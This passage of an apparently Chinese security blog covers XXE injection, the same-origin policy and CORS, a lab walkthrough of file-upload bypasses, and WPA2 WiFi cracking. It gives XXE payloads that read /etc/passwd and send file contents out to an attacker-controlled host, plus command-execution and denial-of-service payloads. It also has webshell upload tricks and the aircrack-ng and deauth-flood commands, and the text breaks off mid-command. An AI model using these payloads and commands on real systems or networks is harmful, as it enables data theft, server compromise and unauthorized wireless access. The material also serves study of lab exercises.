--\u0026gt;\r定义上述实体后，在元素部分即可这样引用：\n\u0026lt;creds\u0026gt;\r\u0026lt;user\u0026gt;\u0026amp;xxe;\u0026lt;/user\u0026gt;\r\u0026lt;pass\u0026gt;mypass\u0026lt;/pass\u0026gt;\r\u0026lt;/creds\u0026gt;\r\u0026lt;!-- 使用 \u0026amp;xxe; 对 上面定义的 xxe 实体进行了引用，当输出时， \u0026amp;xxe; 就会被 \u0026quot;test\u0026quot; 替换。 --\u0026gt;\r 实体可分为内部实体和外部实体，上述例子是内部实体，当然实体也可以从外部DTD文件中引用。\n示例：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;ISO-8859-1\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE foo [\r\u0026lt;!ELEMENT foo ANY \u0026gt;\r\u0026lt;!ENTITY xxe SYSTEM \u0026quot;file:///c:/test.dtd\u0026quot; \u0026gt;]\u0026gt;\r\u0026lt;creds\u0026gt;\r\u0026lt;user\u0026gt;\u0026amp;xxe;\u0026lt;/user\u0026gt;\r\u0026lt;pass\u0026gt;mypass\u0026lt;/pass\u0026gt;\r\u0026lt;/creds\u0026gt;\r\u0026lt;!-- 引用外部实体时，当引用资源发生改变，则在xml文档中就可以自动更新 --\u0026gt;\r还有一种引用外部实体方式是引用公用DTD：\n\u0026lt;!DOCTYPE 根元素名称 PUBLIC \u0026quot;DTD标识名\u0026quot; \u0026quot;公用DTD的URI\u0026quot;\u0026gt;\r  实体也可分为通用实体和参数实体\n通用实体\n用 \u0026amp;实体名;引用的实体，在DTD中定义，在XML文档中引用。\n示例：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE updateProfile [\r\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///c:/windows/win.ini\u0026quot;\u0026gt;]\u0026gt; \u0026lt;updateProfile\u0026gt; \u0026lt;firstname\u0026gt;Joe\u0026lt;/firstname\u0026gt; \u0026lt;lastname\u0026gt;\u0026amp;file;\u0026lt;/lastname\u0026gt; ... \u0026lt;/updateProfile\u0026gt;\r参数实体\n 使用 % 实体名(中间有个空格) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用参数实体 只有在DTD文件中，参数实体的声明才能引用其他实体 和通用实体一样，参数实体也可以外部引用  示例：\n\u0026lt;!ENTITY % an-element \u0026quot;\u0026lt;!ELEMENT mytag (subtag)\u0026gt;\u0026quot;\u0026gt; \u0026lt;!ENTITY % remote-dtd SYSTEM \u0026quot;http://somewhere.example.org/remote.dtd\u0026quot;\u0026gt; %an-element; %remote-dtd;\r XML实体注入 当引用了一个外部实体后，就可能存在一定的问题，如下代码是一个引用外部实体的例子：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE demo[\r\u0026lt;!ENTITY content SYSTEM \u0026quot;file:///c:/test.dtd\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;demo\u0026gt;\u0026amp;content;\u0026lt;/demo\u0026gt;\r当更改路径dtd文件的路径，是否就可直接获得一些敏感文件的内容。\n XXE的重点就在于关注外部实体。\n 利用 读取敏感文件 有回显 当服务端接收XML文档解析并进行回显时，即可修改XML代码以读取服务端上的敏感文件。\n示例：\n# 服务端 \u0026lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds; ?\u0026gt;// 加载xml文档内容并echo进行回显 payload：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY file SYSTEM \u0026quot;file:///etc/passwd\u0026quot;\u0026gt; ]\u0026gt; \u0026lt;test\u0026gt;\u0026amp;file;\u0026lt;/test\u0026gt;\r\r\n 注意：读取文件时，文件所在目录要有可执行权限\n  问题：上述例子读取了一个纯净文件，那么当文件中含有影响xml文档语义的字符该怎么办？例如\u0026lt;,\u0026gt;,\u0026amp;,\u0026quot;,'等。\n 示例：\n\r\n可成功读出，当加入特殊字符，则无法读出：\n\r\n解决1-引入CDATA：\n CDATA的作用就是将原始数据内容视为纯字符数据而不再具备语义。\n\u0026lt;![CDATA [\r....\r]]\u0026gt;\r所以只要将读出的文本内容用CDATA包裹起来就可以。\n 需要借助参数实体：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE test [\r\u0026lt;!ENTITY % start \u0026quot;\u0026lt;![CDATA[\u0026quot;\u0026gt; \u0026lt;!ENTITY % file SYSTEM \u0026quot;file:///usr/haha\u0026quot;\u0026gt; \u0026lt;!ENTITY % end \u0026quot;]]\u0026gt;\u0026quot;\u0026gt; \u0026lt;!ENTITY % dtd SYSTEM \u0026quot;http://192.168.0.106/evil.dtd\u0026quot;\u0026gt; %dtd; ]\u0026gt; \u0026lt;test\u0026gt;\u0026amp;all;\u0026lt;/test\u0026gt;\revil.dtd:\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!ENTITY all \u0026quot;%start;%file;%end;\u0026quot;\u0026gt;\r可成功读出：\n\r\n解决2-伪协议编码读取：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY file SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha\u0026quot;\u0026gt; ]\u0026gt; \u0026lt;test\u0026gt;\u0026amp;file;\u0026lt;/test\u0026gt;\r无回显 实际环境中XML更多用于配置文件和传输数据，一般不会有回显。所以更多是无回显的场景。即，blind XXE。\n示例：\n# 服务端  \u0026lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?\u0026gt;payload：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE foo [\r\u0026lt;!ELEMENT foo ANY\u0026gt;\r\u0026lt;!ENTITY % file SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % xxe SYSTEM \u0026quot;http://192.168.0.106/dtd.dtd\u0026quot;\u0026gt;\r%xxe;\r%all;\r]\u0026gt;\r\u0026lt;foo\u0026gt;\u0026amp;send;\u0026lt;/foo\u0026gt;\rdtd.dtd:\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!ENTITY % all \u0026quot;\u0026lt;!ENTITY send SYSTEM 'http://192.168.0.105/haha.php?p=%file;'\u0026gt;\u0026quot;\u0026gt;\r带出结果：\n\r\n 注意：\n 在dtd.dtd文件中不直接定义send实体去发送请求是因为这样做file实体参数是无法解析的，因此需要外加一层all参数实体声明，当参数实体all引用时才会解析file实体 当带出大文件时会报错，估计是在URI长度有限制**(this is a question)** file实体解析后的文件内容实际是不纯净的，一般末尾会跟有0x0a(如下图)，所以放到直接放到URL里会报非法url的错，所以可以使用伪协议编码后进行外带  \r\n 然而，有时候无法引入外部实体(因为防火墙等原因)，同样也是无回显场景，这时可以尝试引入系统自带的一些dtd文件，实现重新定义一些参数实体从而外带数据：\n linux：/usr/share/yelp/dtd/docbookx.dtd windows:C:\\Windows\\System32\\wbem\\xml  payload：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE message [\r\u0026lt;!ENTITY % remote SYSTEM \u0026quot;/usr/share/yelp/dtd/docbookx.dtd\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % file SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % ISOamso '\r\u0026lt;!ENTITY \u0026amp;#x25; eval \u0026quot;\u0026lt;!ENTITY \u0026amp;#x26;#x25; send SYSTEM \u0026amp;#x27;http://192.168.0.105/?\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026quot;\u0026gt;\r\u0026amp;#x25;eval;\r\u0026amp;#x25;send;\r'\u0026gt; %remote;\r]\u0026gt;\r\u0026lt;message\u0026gt;1314\u0026lt;/message\u0026gt;\r执行命令 当PHP中安装expect扩展时可用。\npayload：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE xxe [\r\u0026lt;!ELEMENT name ANY \u0026gt;\r\u0026lt;!ENTITY xxe SYSTEM \u0026quot;expect://id\u0026quot;\u0026gt;]\u0026gt;\r\u0026lt;xxe\u0026gt;\r\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\r\u0026lt;/xxe\u0026gt;\rDoS攻击 payload：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE xxe [\r\u0026lt;!ELEMENT name ANY \u0026gt;\r\u0026lt;!ENTITY xxe SYSTEM \u0026quot;file:///dev/random\u0026quot;\u0026gt;]\u0026gt;\r\u0026lt;xxe\u0026gt;\r\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\r\u0026lt;/xxe\u0026gt;\r /dev/random:提供永不为空的随机字节数据流\n 防御方法   使用对应开发语言提供的禁用DTD、禁用外部实体和参数实体等方法\n PHP  libxml_disable_entity_loader(true);\r Java  // 禁用DTDs (doctypes)\rdbf.setFeature(\u0026quot;http://apache.org/xml/features/disallow-doctype-decl\u0026quot;, true);\r// 如果不能禁用DTDs,设置以下两项(同时存在)\rdbf.setFeature(\u0026quot;http://xml.org/sax/features/external-general-entities\u0026quot;, false); //防止外部实体\rdbf.setFeature(\u0026quot;http://xml.org/sax/features/external-parameter-entities\u0026quot;, false); //防止参数实体\r  过滤关键字\n  ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/xxe/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/xxe/","title":"XXE 相关"},{"content":"同源策略 同源定义 要素：协议、域名、端口\n如果两个url的协议、域名和端口相同，那么这两个url同源，否则不同源。\n 示例：\n   URL 是否同源 原因     http://test.com/haha/1.html 参照    https://test.com/2.html 不同源 协议不同   http://test.com:8000/haha/3.html 不同源 端口不同   http://testtest.com/haha/4.html 不同源 主机不同   http://test.com/xixi/5.html 同源    http://test.com/haha/6.html 同源     注：域名和ip即使对应，也算不同源\n 同源策略 同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也最基本的安全功能。它限制来自一个源的文档如何与不同源的资源进行交互。\n\r\n同源策略的目的就是防止恶意网站窃取数据。假如用户访问A网站，登录之后Cookie产生，随即访问B网站，如果没有同源策略限制，B网站的资源则可以读取A网站的Cookie，危害产生。\n限制范围 受策略限制的非同源行为：\n Cookie、localStorage和IndexedDB无法读取 DOM无法获得 AJAX请求可发送但是客户端接收不到返回信息   同源策略允许跨域写(发出请求)，不允许跨域读(接收响应)\n 跨域实现 src属性的标签 在浏览器中，\u0026lt;script\u0026gt;、\u0026lt;img\u0026gt;、\u0026lt;iframe\u0026gt;、\u0026lt;link\u0026gt;等标签都可以跨域加载资源，而不受同源策略的限制。这些带src属性的标签每次加载时，实际上是由浏览器发起了一次 GET 请求。\n 注意：为了安全起见，浏览器不允许对以这种方式加载到的资源进行读写操作，而只能使用标签本身应当具备的能力(比如脚本执行、样式应用等等)。\n CORS(跨域资源共享) CORS允许浏览器向跨源服务器发出XMLHttpRequest请求，并且接收响应，克服了AJAX只能同源使用的限制。\n当发出XMLHttpRequest请求时，浏览器会自动在HTTP请求头中加入Origin字段，服务端识别该字段并判断此\u0026quot;源(origin)\u0026ldquo;是否是合法的，如果合法则允许跨域资源访问。\n示例：\n http://www.a.com/test.html 网站发起跨域的 ⅩMLHttpRequest 请求，请求地址为http://www.b.com/test.php。 请求头中加入Origin：  \r\n 服务端校验该Origin Header(Origin Header 可以用于防范 CSRF，它不像 Referer 那么容易被伪造或清空)，并设置响应头Access-Control-Allow-Origin: *，返回该响应。 Access-Control-Allow-Origin: *意味着信任任何源的跨域请求(极其危险)，浏览器接收到该响应，认为允许跨域，便不做拦截，客户端的跨域请求通过。  \r\nJSONP跨域 JSONP原理：\n\u0026lt;script\u0026gt;是可跨域的，而且在跨域脚本中可以通过传参直接回调当前客户端脚本定义的函数。\n例如Google的AJAX搜索接口：\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; //添加\u0026lt;script\u0026gt;标签的方法  function addScriptTag(src){ var script = document.createElement(\u0026#39;script\u0026#39;); script.setAttribute(\u0026#34;type\u0026#34;,\u0026#34;text/javascript\u0026#34;); script.src = src; document.body.appendChild(script); } window.onload = function(){ //搜索apple，将自定义的回调函数名result传入callback参数中  addScriptTag(\u0026#34;http://ajax.googleapis.com/ajax/services/search/web?v=1.0\u0026amp;q=apple\u0026amp;callback=result\u0026#34;); } //自定义的回调函数result  function result(data) { //弹出\u0026#39;apple搜\u0026#39;索结果的第一条记录中url数据  alert(data.responseData.results[0].unescapedUrl); } \u0026lt;/script\u0026gt; 设置document.domain 原理：\n让两个不同的子域通过设置document.domain为同一个父域，借助iframe标签，实现两个子域的交互。\n示例：\n// http://a.test.com/a.html：加载窗口，设置父域 \u0026lt;iframe id = \u0026#34;iframe\u0026#34; src=\u0026#34;http://b.test.com/b.html\u0026#34; onload = \u0026#34;haha()\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.domain = \u0026#39;test.com\u0026#39;; //设置父域  function haha(){ alert(document.getElementById(\u0026#39;￼iframe\u0026#39;).contentWindow); //contentWindows属性返回子窗口的 window 对象，以此获取内部的DOM  } \u0026lt;/script\u0026gt; // http://b.test.com/b.html：设置父域 \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.domain = \u0026#39;test.com\u0026#39;; //当iframe加载这个页面时，也设置document.domain，使之与主页面的document.domain相同 \u0026lt;/script\u0026gt; window.postMesage方法 HTML5新增了postMessage方法：\npostMessage：otherWindow.postMessage(message, targetOrigin);\n otherWindow：指目标窗口，即向哪个window发送消息，可以是window.frames 属性的成员或者由 window.open 方法创建的窗口 message：是要发送的消息，类型为 String、Object targetOrigin：是限定消息接收范围，不限制请使用 *  跨域原理：\niframe标签加载目标域内容，加载时通过postMesage传送消息，在目标域中通过监听message时间来获取消息。\n 可跨主域、双向跨域\n 示例：\n// test.com/test.html：加载窗口并发送消息 \u0026lt;body\u0026gt; \u0026lt;iframe id=\u0026#34;proxy\u0026#34; src=\u0026#34;http://target.com/remote.html\u0026#34; onload = \u0026#34;postMsg()\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var obj = { msg: \u0026#39;hahaha!\u0026#39; } function postMsg (){ var iframe = document.getElementById(\u0026#39;proxy\u0026#39;); var win = iframe.contentWindow; win.postMessage(obj,\u0026#39;http://target.com\u0026#39;); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; // http://target.com/remote.html：监听事件，获取消息 \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.onmessage = function(e){ if(e.origin !== \u0026#39;http://localhost:8088\u0026#39;) return; alert(e.data.msg+\u0026#34; from \u0026#34;+e.origin); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; CORS 与 CSRF异同 相同点：\n 都需要借助第三方网站 都需要借助 AJAX 的异步过程 一般都需要用户登录  不同点：\n 第三方网站可以利用 CORS 漏洞读取到受害者的敏感信息 第三方网站可以利用 CSRF 漏洞可以让受害者执行一些敏感操作 一般有 CORS 漏洞的地方也会有 CSRF 漏洞  ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/web-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/web-1/","title":"同源策略"},{"content":"文件上传相关 初始参考思路 \r\nPASS1 直接上传快速弹框，且点击上传抓包无数据，属于前端校验\n\r\n方式一：修改原始后缀，先绕过前端，再修改后缀和Content-Type\n方式二：抓包修改响应包，前端禁用JS即可\nPASS2 直接上传响应类型不正确，应该是后端校验\n\r\n修改后缀为.jpg失败，修改Conten-Type成功(MIME检测)\n\r\n常见MIME\n\r\nPASS3 直接上传显示如下，表示存在基于后缀的黑名单\n\r\n修改后缀为一些特殊后缀用于绕过，并且能够服务器解析php文件：php3、php5、php7、phtml、pht\n\r\n注意：题目docker环境中默认没有开启对phtml等后缀的解析，可编辑/etc/mime.types 去掉部分行的注释即可\n\r\nPASS4 直接上传提示如下\n\r\n上传非法后缀可以，表示存在黑名单，但是未过滤.htaccess\n上传.htaccess重写解析规则绕过\n\rimage-20210426161432665\r\n表明将jpg后缀当作php来解析，再上传一个php文件抓包修改后缀即可成功解析\n\r\n注意：题目docker环境中.htaccess并不会重写生效，需要做如下配置\n sudo a2enmod 随后输入rewrite表示让apache加载重写模块 修改/etc/apache2/apache2.conf 文件下如下部分 \r 重启docker环境  PASS5 还是和PASS4一样黑名单(加入了.htaccess)，但是未转小写，可通过大写绕过\n\r\nPASS6 黑名单，加入.htaccess，转小写,但是未去空格\n上传php文件，文件名后加空格绕过\nPASS7 黑名单，转小写，去空格，未去'.'\n上传php文件，文件名后加.绕过\n\r\n注意：PASS6 和 PASS7都是利用了windows系统的文件名特性，在文件名后加[空格]、[.]会被自动去除，例如shell.php[空格] 或 shell.php[.]保存至windows后即为shell.php。但是在linux docker环境下空格绕过失败、加点绕过成功（多后缀解析漏洞）。\n多后缀解析漏洞\nAddHandler application/x-httpd-php .php //只要含.php的都会被当作php文件被解析 或者 \u0026lt;FilesMatch \u0026quot;.+\\.ph(ar|p|tml)\u0026quot;\u0026gt;\rSetHandler application/x-httpd-php\r\u0026lt;/FilesMatch\u0026gt; 上面两个配置都可以实现解析文件名中包含.php后缀的文件，apache对文件后缀名的识别是从后向前进行匹配的，以单个.作为分隔符。当遇到不认识的后缀时继续往前，直到识别，若都不识别就不做处理。\nPASS8 黑名单，未去除'::$DATA\u0026rsquo;字符串\n在文件名后添加::$DATA绕过\nwindows文件流特性\nNTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。创建一个数据交换流文件的方法：“宿主文件:准备与宿主文件关联的数据流文件”\n比如:shell.php::$DATA 上传至windows实际上访问的就是shell.php本身流数据 。如果shell.php还有别的数据流，比如:shell.php:shell1.php ,那么请求shell.php:shell1.php::$DATA，实际上访问的是shell.php流数据中的shell1.php流数据\n也就是说在后端判断时可绕过后缀名检测，落地后即为shell.php，可以正常解析。\nPASS9 黑名单，去除点，首尾去空\n类似PASS6，在文件名后添加. .(点 空格 点)绕过\n\r\n后端去除点、去空后为shell.php. 可正常解析\nPASS10 黑名单，上传.php文件去除了php后缀\n双写绕过\n\r\nPASS11 上传任意后缀失败，白名单\nGET请求中的save_path可控，使用%00截断绕过白名单\n作者提供的linux docker下失败，原因为PHP版本=5.5.38\n注意： 00截断利用条件 PHP版本\u0026lt;5.3.4、magic_quotes_gpc=off(magic_quotes_gpc开关作用时间是请求开始时，表示在SQL语句执行前对字符串内容是否进行转义)\n00截断原理 0x00是字符串的结束标识符；真正发挥作用是在处于路径中并和文件名进行拼接，从而发生截断，成功绕过白名单限制；路径一般可以在URL、Cookie、表单中，对于URL和Cookie而言，浏览器端和服务器端都会进行一次urldecode，这样就会将%00解码转换为字符串结束符，对于表单而言，如果有属性enctype=\u0026ldquo;multipart/form-data\u0026rdquo;(表示不会对表单数据进行编码)，服务端接收到表单数据中的%00并不会urldecode，自然无法转换成结束符，这时候需要手动转为十六进制确保其为结束符\nform表单enctype属性 application/x-www-form-urlencoded:在发送前编码所有字符(默认)\nmultipart/form-data:不对字符编码，或在使用包含文件上传控件的表单时，必须使用该值\ntext/plain:空格转换为 \u0026ldquo;+\u0026rdquo; 加号，但不对特殊字符编码\n综上 确保是路径中使用、在URL or Cookie中直接%00即可、在表单中(enctype=\u0026ldquo;multipart/form-data\u0026rdquo;)需要手动转\nPASS12 上传任意后缀失败，白名单\nPOST请求中的sava_path可控，不能再使用%00了，因为POST中不会像URL中那样可以解码。在Burp的hex中在路径后添加0x00实现截断\n同11失败了\nPASS13 从文件头中读取图片的相关特征确保上传的为图片类文件\n用图下代码判断文件头\nfunction getReailFileType($filename){\r$file = fopen($filename, \u0026quot;rb\u0026quot;);\r$bin = fread($file, 2); //只读2字节\rfclose($file);\r$strInfo = @unpack(\u0026quot;C2chars\u0026quot;, $bin); //按照指定格式解二进制数据 $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg';\rbreak;\rcase 13780: $fileType = 'png';\rbreak; case 7173: $fileType = 'gif';\rbreak;\rdefault: $fileType = 'unknown';\r} return $fileType;\r}\rGIF绕过，文件头中添加GIF89a\n\r\nJPG绕过，使用命令生成图片马，再上传即可\n\r\nPNG类似\n**注意：**仅仅只是上传了图片马，需要配合文件包含漏洞才能解析为PHP\nPASS14 使用如下代码判断是否为真实图片\nfunction isImage($filename){\r$types = '.jpeg|.png|.gif';\rif(file_exists($filename)){\r$info = getimagesize($filename);\r$ext = image_type_to_extension($info[2]);\rif(stripos($types,$ext)){\rreturn $ext;\r}else{\rreturn false;\r}\r}else{\rreturn false;\r}\r}\rgetimagesize\n\u0026lt;?php\rlist($width, $height, $type, $attr) = getimagesize(\u0026quot;test.png\u0026quot;);\recho \u0026quot;宽度为：\u0026quot; . $width;\recho \u0026quot;高度为：\u0026quot; . $height;\recho \u0026quot;类型为：\u0026quot; . $type;\recho \u0026quot;属性：\u0026quot; . $attr;\r?\u0026gt;\r同样可使用PASS13中的图片马绕过\nPASS15 使用php_exif模块检测文件类型，同PASS13上传图片马即可\nPASS16 进行了二次渲染，具体绕过思路就是比较上传后且渲染过的正常图片和原始图片的区别，在相同的部分插入webshell代码\n参考如下：\nhttps://xz.aliyun.com/t/2657#toc-12\nPASS17 白名单，条件竞争。代码逻辑：先上传上来，再判断是否为白名单类型或者其他判断等，如果非法就立刻删除，如果合法就重命名，即先落地再判断处理\n绕过方法\n初始上传一个shell1.php，内容为生成一个webshell，当shell1.php上传成功后，利用时间差客户端立刻访问该php确保能够生成webshell(可以配合burp不断发送上传包，同时浏览器不断访问shell1.php即可)\nPASS18 白名单+条件竞争。代码逻辑：上传上来，做后缀、大小等各种判断后，再重命名\n绕过方法\n上传一个白名单多后缀PHP文件，配合Apache解析漏洞， 不断重放会成功上传而没有被重命名\n\r\nPASS19 上传后保存的文件名完全可控，源码中未处理大小写\n可以大小写绕过，可以利用00截断(CVE-2015-2348 https://www.cnblogs.com/cyjaysun/p/4390930.html)，可以利用move_uploaded_file忽视\u0026quot;/.\u0026quot;\nPASS20 审计\n$is_upload = false;\r$msg = null;\rif(!empty($_FILES['upload_file'])){\r//检查MIME\r$allow_type = array('image/jpeg','image/png','image/gif');\rif(!in_array($_FILES['upload_file']['type'],$allow_type)){\r$msg = \u0026quot;禁止上传该类型文件!\u0026quot;;\r}else{\r//检查文件名\r$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\rif (!is_array($file)) {\r$file = explode('.', strtolower($file)); //save_name参数如果不是数组，就用\u0026quot;.\u0026quot;拆分为数组\r}\r$ext = end($file);\r$allow_suffix = array('jpg','png','gif');\rif (!in_array($ext, $allow_suffix)) {\r$msg = \u0026quot;禁止上传该后缀文件!\u0026quot;;\r}else{\r$file_name = reset($file) . '.' . $file[count($file) - 1]; //reset表示将数组指针移到首位\r$temp_file = $_FILES['upload_file']['tmp_name'];\r$img_path = UPLOAD_PATH . '/' .$file_name;\rif (move_uploaded_file($temp_file, $img_path)) {\r$msg = \u0026quot;文件上传成功！\u0026quot;;\r$is_upload = true;\r} else {\r$msg = \u0026quot;文件上传失败！\u0026quot;;\r}\r}\r}\r}else{\r$msg = \u0026quot;请选择要上传的文件！\u0026quot;;\r}\r审计可知，先判断MIME类型，其再获取save_name，不为数组直接以\u0026quot;.\u0026ldquo;拆分为数组，随后取数组最后位置元素为扩展名，但是重命名文件名时使用了$file[count($file) - 1]，因此绕过方法即为让save_name[0] = test.php 、save_name[2] = jpg ，则count($file)值为2，$file[count($file) - 1]即为$file[1]，为空，最后拼接文件名为\u0026quot;test.php.\u0026quot;，利用多后缀解析即可。\n\r\n也可以利用move_uploaded_file忽视\u0026rdquo;/.\u0026ldquo;绕过，落地后文件名即为shell.php\n\r\n整理 可解析后缀 asp/aspx语言：asp、aspx、asa、asax、ascx、ashx、asmx、cer php语言：php、php5、php4、php3、php2、phtml、pht jsp语言：jsp、jspa、jspx、jsw、jsv、jspf、jhtml\n中间件漏洞 IIS\nIIS 6.0 文件解析 xx.asp;.jpg IIS 6.0 目录解析 xx.asp/1.jpg IIS 7.5 畸形解析 xxx.jpg/x.php Apache\n%0a (CVE-2017-15715) 多后缀解析 test.php.xxx nginx\n访问链接加 /xxx.php，即 test.jpg/xxx.php 畸形解析漏洞 test.jpg%00xxx.php CVE-2013-4547 test.jpg(非编码空格)\\0x.php\ntomcat(需要配合Windows特性)\nxxx.jsp/ xxx.jsp%20 xxx.jsp::$DATA\n系统特性 Windows 下 ADS 流特性，导致上传文件 xxx.php::$DATA = xxx.php Windows 下文件名结尾加入.、空格、\u0026lt;、\u0026gt;、\u0026raquo;\u0026gt;、0x81-0xff等字符，最终生成的文件均被会被Windows 忽略\n防御  文件上传目录设置为不可执行（文件上传后做独立存储，做静态文件处理）：web容器无法解析该目录下的文件 通过白名单判断文件类型（图片可以做压缩和resize处理，破坏其中的可能包含的html或php代码） 使用随机随改写文件名和文件路径（攻击者不知道路径和改写后的文件名就无法直接访问该文件）  ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/file-upload/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/file-upload/","title":"文件上传"},{"content":"破解WiFi密码 基础 WPA2其实是基于WPA的一种新的加密方式。WPA指的是保护无线电脑网络安全系统（Wi-Fi Protected Access），大大增强现有以及未来无线局域网系统的数据保护和访问控制水平。而WPA2是WPA的增强型版本，与WPA相比，WPA2新增了支持AES的加密方式。WPA2其安全性是利用密钥导出函数来增强的，但是使用者采用的典型的弱密也会被密码破解攻击。\nWPA密码其实称为PSK，长度一般是8-63字节，它加上ssid通过哈希算法可以得到PMK，PMK是定长的64字节。由于计算PMK的过程开销比较大，是破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成的。\n在认证的时候会生成一个PTK，这是一组密钥，它的生成方法也是采用哈希，参数是连接的客户端MAC地址、AP的BSSID、A-NONCE、S-NONCE、PMK，其中A-NONCE和S-NONCE是两个随机数，确保每次连接都会生成不同的PTK，PTK的计算消耗很小，PTK加上报文数据采用加密算法（AES或TKIP）得到密文，同时会得到一个签名，叫做MIC（message integrality check）。\n破解密码的关键流程：\n PMK = SHA-1(SSID, PSK) PTK = hash(MAC, BSSID, A-NONCE, S-NONCE, PMK) 密文 = AES或TKIP(PTK, data) 签名MIC = HMAC(PTK, 整个802.1x认证报文)  在握手包过程中可以获得的是：客户端的MAC地址，AP的BSSID，A-NONCE，S-NONE，MIC。而认证原理就是客户端算出MIC发给AP，AP也采用相同方法计算并与之比较，若一致则认证通过。\n破解：\n  先抓取握手包\n  用字典中的PSK+ssid先生成PMK（如果有已经生成好的HASH表则略过）\n  结合握手包中的（客户端MAC，AP的BSSID，A-NONCE，S-NONCE）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥\n  原理 通过DeAuth泛洪攻击让连接WiFi的设备断开连接，客户端设备会尝试重联，在这个过程中监听某设备与WiFi重新建立连接时的握手包，其中包含密文密码，随后使用工具破解即可。\n利用 开启网卡监听 airmon-ng start wlan0\r扫描WiFi信号 airodump-ng wlan0mon\r\r\n各个参数含义：\n BSSID 路由器的 MAC 地址 PWR 信号的强度，数值越大代表信息越强 CH 信道 ENC 加密的方式 AUTH 认证方式 ESSID WIFI名字  监听流量 airodump-ng -w wifi名 -c 信道 --bssid xxxx wlan0mon\rDeAuth泛洪攻击 aireplay-ng -0 0 -a WIFI物理地址 -c 用户设备物理地址 wlan0mon\r# 参数\r-0 3 表示发送3次，-0 0 表示持续发送；不加 -c 参数表示断开所有客户端的连接\r暴力破解 查看所拦截的数据包，检测这个包里是否有握手包：\naircrack-ng /tmp/xxx.cap 破解：\naircrack-ng /tmp/xxx.cap -w 